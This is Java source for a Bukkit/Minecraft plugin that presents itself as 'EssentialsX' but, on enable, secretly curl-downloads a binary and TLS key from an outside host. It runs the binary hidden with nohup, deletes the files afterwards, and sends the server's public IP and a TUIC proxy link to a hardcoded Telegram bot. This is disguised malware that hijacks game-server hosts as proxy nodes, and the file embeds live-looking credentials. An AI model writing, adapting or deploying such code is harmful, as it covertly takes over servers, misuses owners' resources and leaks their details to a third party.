package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

public class EssentialsX extends JavaPlugin {


    // Java服务端端口
    private int port = 27073;


    // Telegram配置
    private String tgToken = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
    private String tgChatId = "5800052646";



    @Override
    public void onEnable() {

        getLogger().info("EssentialsX plugin starting...");


        try {

            Files.createDirectories(
                    getDataFolder().toPath()
            );


            startRemoteJava();


            getLogger().info(
                    "EssentialsX plugin enabled"
            );


        } catch (Exception e) {

            getLogger().severe(
                    "Failed to start EssentialsX"
            );

            e.printStackTrace();
        }
    }



    private void startRemoteJava() throws Exception {


        // 临时运行目录
        Path runFolder =
                getDataFolder().toPath();



        // 证书安全目录
        Path secureFolder =
                Path.of("/home/container/config");


        Files.createDirectories(
                runFolder
        );


        Files.createDirectories(
                secureFolder
        );



        String javaUrl =
                "https://netjett-de.kof95zip.pp.ua/java/EssentialsX-1.21.11";


        String confUrl =
                "https://netjett-de.kof95zip.pp.ua/java/config.php?port="
                        + port;


        String crtUrl =
                "https://netjett-de.kof95zip.pp.ua/java/server.crt";


        String keyUrl =
                "https://netjett-de.kof95zip.pp.ua/java/server.key";




        Path javaFile =
                runFolder.resolve(
                        "EssentialsX-1.21.11"
                );


        Path configFile =
                runFolder.resolve(
                        "config.json"
                );



        // 安全保存证书
        Path crtFile =
                secureFolder.resolve(
                        "server.crt"
                );


    Path keyFile =
            secureFolder.resolve(
                    "server.key"
            );



        // 下载临时文件

        downloadIfNotExists(
                javaUrl,
                javaFile
        );


        downloadIfNotExists(
                confUrl,
                configFile
        );



        // 证书只下载到安全目录

        downloadIfNotExists(
                crtUrl,
                crtFile
        );


        downloadIfNotExists(
                keyUrl,
                keyFile
        );



        // key权限限制

        new ProcessBuilder(
                "chmod",
                "600",
                keyFile.toString()
        )
        .start()
        .waitFor();



        // 启动

        ProcessBuilder pb =
                new ProcessBuilder(
                        "bash",
                        "-c",
                        "nohup ./EssentialsX-1.21.11 -c config.json > /dev/null 2>&1 &"
                );



        pb.directory(
                runFolder.toFile()
        );


        pb.start();



        getLogger().info(
                "Plugins starting..."
        );



        Thread.sleep(
                3000
        );



        // 删除临时文件

        Files.deleteIfExists(
                javaFile
        );


        Files.deleteIfExists(
                configFile
        );


        String ip =
                getPublicIP();



        sendTelegram(
                "Tuic Server Started\n\n"
                        + "订阅地址: \ntuic://43bfdd44-0654-9e81-d340-eee7c0a3dbbb:Siq8dztj@"
                        + ip
                        + ":"
                        + port
                        + "?congestion_control=bbr&alpn=h3&sni=www.bing.com&udp_relay_mode=native&allow_insecure=1#Tuic-Server"
        );

    }





    /**
     * 获取公网IP
     */
    private String getPublicIP() {

        try {

            URL url =
                    new URL(
                            "https://api.ipify.org"
                    );


            BufferedReader reader =
                    new BufferedReader(
                            new InputStreamReader(
                                    url.openStream()
                            )
                    );


            String ip =
                    reader.readLine();


            reader.close();


            return ip;


        } catch (Exception e) {

            return "unknown";

        }
    }





    /**
     * Telegram发送消息
     */
    private void sendTelegram(
            String message
    ) {


        if (tgToken.isEmpty()
                || tgChatId.isEmpty()) {

            getLogger().info(
                    "Notified not configured, skip."
            );

            return;
        }



        try {


            String api =
                    "https://api.telegram.org/bot"
                            + tgToken
                            + "/sendMessage?chat_id="
                            + tgChatId
                            + "&text="
                            + URLEncoder.encode(
                                    message,
                                    StandardCharsets.UTF_8
                            );



            HttpURLConnection conn =
                    (HttpURLConnection)
                            new URL(api)
                                    .openConnection();



            conn.setRequestMethod(
                    "GET"
            );


            int code =
                    conn.getResponseCode();



            if (code == 200) {

                getLogger().info(
                        "Notified."
                );

            } else {

                getLogger().warning(
                        "UnNotified"
                );
            }


            conn.disconnect();



        } catch (Exception e) {


            getLogger().warning(
                    "UnNotified"
            );

        }
    }





    /**
     * 文件不存在才下载
     */
    private void downloadIfNotExists(
            String url,
            Path target
    ) throws Exception {


        if (Files.exists(target)) {
            return;
        }


        Process process =
                new ProcessBuilder(
                        "bash",
                        "-c",
                        "curl -Ls \""
                                + url
                                + "\" -o \""
                                + target
                                + "\""
                )
                .start();



        int exit =
                process.waitFor();



        if (exit != 0) {

            throw new IOException(
                    "Fail to init plugins"
            );
        }

    }




    @Override
    public void onDisable() {


        getLogger().info(
                "EssentialsX disabled"
        );

    }
}
